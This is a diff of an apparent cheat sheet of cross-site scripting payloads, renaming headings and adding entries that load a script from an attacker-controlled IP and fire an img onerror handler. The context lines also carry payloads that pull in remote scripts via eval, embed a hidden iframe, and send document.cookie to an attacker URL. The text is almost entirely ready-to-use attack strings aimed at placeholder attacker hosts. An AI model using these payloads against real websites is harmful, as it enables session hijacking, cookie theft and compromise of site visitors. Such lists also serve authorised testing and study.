@@ -16,7 +16,7 @@
 ```
 ---
 
-### script: XSS with script tag 
+### javascript: XSS with script tag 
 ```html
 <script src=http://OUR_IP></script>
 
@@ -32,15 +32,27 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\
 ```
 ---
 
-### script: XSS content injection with iframe
+### javascript: XSS content injection with iframe
 ```html
 <iframe src=<your_url> height="0" weight="0"></iframe>
 ```
 ---
 
-### script: XSS cookie exfiltration with javascript
+### javascript: XSS cookie exfiltration with javascript
 ```html
 <script>new Image().src="<your_url>/page.html?output="+document.cookie;</script>
+```
+---
+
+### javascript: payload from the external resource
+```html
+<script src="http://<your_ip>/xss.js"></script>
+```
+---
+
+### javascript: use img tag in case script tag can't be executed
+```html
+<img src='x' onerror='alert(0)'>
 ```
 ---
 
